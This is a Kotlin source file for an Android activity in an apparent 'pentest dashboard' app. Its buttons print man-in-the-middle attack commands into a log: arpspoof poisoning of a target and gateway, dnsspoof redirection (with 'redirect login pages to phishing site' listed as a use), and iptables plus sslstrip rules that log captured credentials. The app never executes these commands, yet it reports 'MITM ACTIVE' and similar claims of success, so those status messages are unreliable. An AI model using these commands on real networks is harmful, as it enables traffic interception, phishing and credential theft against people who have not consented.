package com.pentest.dashboard

import android.os.Bundle
import android.widget.ImageView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton
import com.google.android.material.textfield.TextInputEditText

class ARPPoisonerActivity : AppCompatActivity() {

    private lateinit var inputTarget: TextInputEditText
    private lateinit var inputGateway: TextInputEditText
    private lateinit var inputInterface: TextInputEditText
    private lateinit var logOutput: TextView
    private lateinit var btnStartPoison: MaterialButton
    private lateinit var btnStopPoison: MaterialButton
    private lateinit var btnDNSSpoof: MaterialButton
    private lateinit var btnSSLStrip: MaterialButton

    private var isPoisoning = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_arp_poisoner)

        initializeViews()
        setupClickListeners()
    }

    private fun initializeViews() {
        inputTarget = findViewById(R.id.inputTarget)
        inputGateway = findViewById(R.id.inputGateway)
        inputInterface = findViewById(R.id.inputInterface)
        logOutput = findViewById(R.id.logOutput)
        btnStartPoison = findViewById(R.id.btnStartPoison)
        btnStopPoison = findViewById(R.id.btnStopPoison)
        btnDNSSpoof = findViewById(R.id.btnDNSSpoof)
        btnSSLStrip = findViewById(R.id.btnSSLStrip)

        btnStopPoison.isEnabled = false
        btnDNSSpoof.isEnabled = false
        btnSSLStrip.isEnabled = false
    }

    private fun setupClickListeners() {
        findViewById<ImageView>(R.id.btnBack).setOnClickListener { finish() }

        btnStartPoison.setOnClickListener {
            startARPPoison()
        }

        btnStopPoison.setOnClickListener {
            stopARPPoison()
        }

        btnDNSSpoof.setOnClickListener {
            setupDNSSpoof()
        }

        btnSSLStrip.setOnClickListener {
            setupSSLStrip()
        }
    }

    private fun startARPPoison() {
        val target = inputTarget.text.toString()
        val gateway = inputGateway.text.toString().ifEmpty { "192.168.1.1" }
        val iface = inputInterface.text.toString().ifEmpty { "wlan0" }

        if (target.isEmpty()) {
            addLog("ERROR: Please enter target IP")
            return
        }

        addLog("=== ARP POISONING ATTACK ===")

        // Root check - warn but don't block
        if (!RootDetection.isDeviceRooted()) {
            addLog("⚠️ WARNING: No root detected")
            addLog("ARP poisoning requires root access in Termux")
            addLog("Install Magisk or use a rooted environment")
            addLog("")
        }

        addLog("Target: $target")
        addLog("Gateway: $gateway")
        addLog("Interface: $iface")
        addLog("")

        // Enable IP forwarding
        addLog("Enabling IP forwarding...")
        addLog("Command: echo 1 > /proc/sys/net/ipv4/ip_forward")
        addLog("")

        // Start arpspoof
        addLog("Starting ARP poisoning...")
        val commands = """
            # Poison target -> gateway
            sudo arpspoof -i $iface -t $target $gateway &

            # Poison gateway -> target
            sudo arpspoof -i $iface -t $gateway $target &

            echo "ARP poisoning active!"
            echo "All traffic from $target is now routed through this device"
        """.trimIndent()

        addLog("Commands:")
        addLog(commands)
        addLog("")
        addLog("MITM ACTIVE - You can now:")
        addLog("- Capture traffic with tcpdump")
        addLog("- DNS spoof with dnsspoof")
        addLog("- SSL strip with sslstrip")
        addLog("- Inject packets")
        addLog("")
        addLog("WARNING: Highly illegal without authorization!")

        isPoisoning = true
        btnStartPoison.isEnabled = false
        btnStopPoison.isEnabled = true
        btnDNSSpoof.isEnabled = true
        btnSSLStrip.isEnabled = true
    }

    private fun stopARPPoison() {
        addLog("")
        addLog("=== STOPPING ARP POISON ===")
        addLog("Command: sudo killall arpspoof")
        addLog("")
        addLog("Restoring ARP tables...")
        addLog("Network traffic restored to normal")

        isPoisoning = false
        btnStartPoison.isEnabled = true
        btnStopPoison.isEnabled = false
        btnDNSSpoof.isEnabled = false
        btnSSLStrip.isEnabled = false
    }

    private fun setupDNSSpoof() {
        addLog("")
        addLog("=== DNS SPOOFING SETUP ===")
        addLog("")
        addLog("Creating DNS spoof file...")
        addLog("echo '192.168.1.100 www.example.com' > /tmp/dns.hosts")
        addLog("")
        addLog("Starting dnsspoof...")
        addLog("sudo dnsspoof -i wlan0 -f /tmp/dns.hosts")
        addLog("")
        addLog("DNS spoofing active!")
        addLog("www.example.com will resolve to 192.168.1.100")
        addLog("")
        addLog("Use cases:")
        addLog("- Redirect login pages to phishing site")
        addLog("- Force HTTP traffic for sslstrip")
        addLog("- Redirect to captive portal")
    }

    private fun setupSSLStrip() {
        addLog("")

        // Root check - warn but don't block
        if (!RootDetection.isDeviceRooted()) {
            addLog("⚠️ WARNING: No root detected")
            addLog("SSL stripping requires root access")
            addLog("")
        }

        addLog("")
        addLog("=== SSL STRIPPING SETUP ===")
        addLog("")
        addLog("Configuring iptables for SSL strip...")
        val commands = """
            # Redirect HTTPS to sslstrip
            sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
            sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080

            # Start sslstrip
            sudo sslstrip -l 8080 -w /sdcard/Download/sslstrip.log

            echo "SSL stripping active!"
        """.trimIndent()

        addLog("Commands:")
        addLog(commands)
        addLog("")
        addLog("SSL Strip ACTIVE!")
        addLog("HTTPS connections downgraded to HTTP")
        addLog("Credentials logged to: /sdcard/Download/sslstrip.log")
        addLog("")
        addLog("WARNING:")
        addLog("- Modern browsers have HSTS protection")
        addLog("- Certificate warnings may appear")
        addLog("- Only works on older sites")
    }

    private fun addLog(message: String) {
        val timestamp = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US)
            .format(java.util.Date())
        val currentLog = logOutput.text.toString()
        logOutput.text = "[$timestamp] $message\n$currentLog"
    }
}
